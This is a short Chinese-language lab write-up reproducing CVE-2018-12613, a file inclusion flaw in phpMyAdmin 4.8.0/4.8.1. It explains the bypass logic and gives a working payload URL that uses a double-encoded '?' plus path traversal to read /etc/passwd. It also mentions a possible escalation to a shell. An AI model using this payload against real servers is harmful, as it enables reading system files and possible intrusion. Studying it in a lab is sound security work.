# phpmyadmin 4.8.1远程文件包含漏洞（CVE-2018-12613）

###### by ADummy

### 0x00利用路线

​			首先要能登录数据库，然后测试文件包含

### 0x01漏洞介绍

这里需要满足如下5个条件便可以执行包含文件代码`include $_REQUEST['target'];`

1.`$_REQUEST['target']`不为空
2.`$_REQUEST['target']`是字符串
3.`$_REQUEST['target']`开头不是`index`
4.`$_REQUEST['target']`不在`$target_blacklist`中
5.`Core::checkPageValidity($_REQUEST['target'])`为真	

##### 			影响版本

```
phpmyadmin 4.8.0/4.8.1
```

### 0x02漏洞复现

访问`http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd`，结果表明存在文件包含漏洞：

##### %253f 这里是对/进行了2次url编码

function checkFile():

变量未声明、非字符串：return false
$page未在白名单中：return false
以’?'为分割符取出前面字符后得到$_page
$_page未在白名单中：return false
url解码后，重复以上3、4步操作
最后如果request得到的file值非空、是字符串且通过了checkFile，则包含file

因为服务器会自动url解码一次，这里用二次编码。

可能可以getshell，但docker环境下我没找到文件

![phpmyadmin_RFI_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/phpmyadmin_RFI_1.jpg)

![phpmyadmin_RFI_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/phpmyadmin_RFI_2.jpg)

### 0x03参考资料

https://xz.aliyun.com/t/6592

https://blog.csdn.net/weixin_43872099/article/details/104128639	

